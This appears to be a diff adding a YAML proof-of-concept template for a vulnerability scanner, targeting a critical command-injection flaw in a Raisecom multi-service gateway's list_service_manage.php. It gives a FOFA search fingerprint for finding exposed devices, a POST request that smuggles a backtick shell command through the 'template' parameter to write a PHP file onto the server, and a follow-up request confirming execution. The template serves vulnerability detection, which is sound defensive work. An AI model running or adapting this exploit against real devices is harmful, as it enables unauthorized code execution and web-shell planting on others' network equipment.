@@ -1,0 +1,22 @@
+id: poc-yaml-raisecom-gateway-list-service-manage-php-ci
+info:
+  name: 瑞斯康达-多业务智能网关 list_service_manage.php 命令注入漏洞
+  severity: critical
+  tags:
+  - 命令注入
+  finger: 多业务智能网关
+  fofa: body="/images/raisecom/back.gif"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /vpn/list_service_manage.php?template=%60echo+-e+%27%3C%3Fphp+echo+md5%28{{.t1}}%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2F{{.t1}}.php%60
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: Nradius_submit=true
+  expression: status_code == 200 && title == "无标题文档"
+- method: GET
+  path: /tmp/{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
